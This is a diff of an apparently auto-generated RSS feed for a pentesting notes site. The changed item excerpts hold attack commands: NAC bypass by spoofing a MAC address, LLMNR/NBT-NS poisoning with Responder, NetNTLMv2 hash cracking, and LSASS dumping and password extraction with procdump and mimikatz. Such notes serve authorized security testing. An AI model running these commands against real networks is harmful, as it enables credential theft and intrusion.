@@ -107,7 +107,7 @@ Broken Links # Check for broken links and domain takeover # For twitter, Twitter
       
       <guid>/linux-systems/tricks/</guid>
       <description>[WIP]
-# If you need to kill a specific process using a given port sudo fuser -k 445/tcp</description>
+# If you need to kill a specific process using a given port sudo fuser -k 445/tcp# You can use the following trick to easy navigate and select paths or others args # $_ takes the last argument of the last simplec command executed cd $_ # For example mkdir my-folder &amp;amp;&amp;amp; cd $_# You can use xclip to automate clipping # Can be usefull for long outputs (enum4linux, privcheck.</description>
     </item>
     
     <item>
@@ -220,8 +220,7 @@ Local Extraction VSSadmin # Récupération via VSSadmin # Create a Volume Shadow
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/network-and-domain-recon/no_credentials_recon/</guid>
-      <description>Identification # Passiv network listening to identify machines sudo netdiscover -p -i eth0 # You can find the domain big using dig dig -x IP # If the NAC is blocking, you can listen broadcast and collect MAC address # Use printer&amp;#39;s MAC address to bypass NAC 
-LLMNR / NBT-NS # You can Man in The Middle using LLMNR and NBT-NS if they&amp;#39;re bad configured sudo responder -I eth0 -wFv # If you get hashes, will be necessary to crack them john --format=netntlmv2 --wordlist=&amp;#34;/usr/share/wordlists/rockyou.</description>
+      <description>Identification # Passiv network listening to identify machines # By default, it uses interactive mode (incompatible with clean output) # You can use the -P option to get off interactive sudo netdiscover -p -i eth0 sudo netdiscover -p -i eth0 -P # You can find the domain big using dig dig -x IP # If the NAC is blocking, you can listen broadcast and collect MAC address # Use printer&amp;#39;s MAC address to bypass NAC</description>
     </item>
     
     <item>
@@ -1042,7 +1041,7 @@ General # Almost every Impacket scripts follows the same option syntax authentic
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
-      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
+      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp # Several dumping methods here https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/ 
 Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
     </item>
     
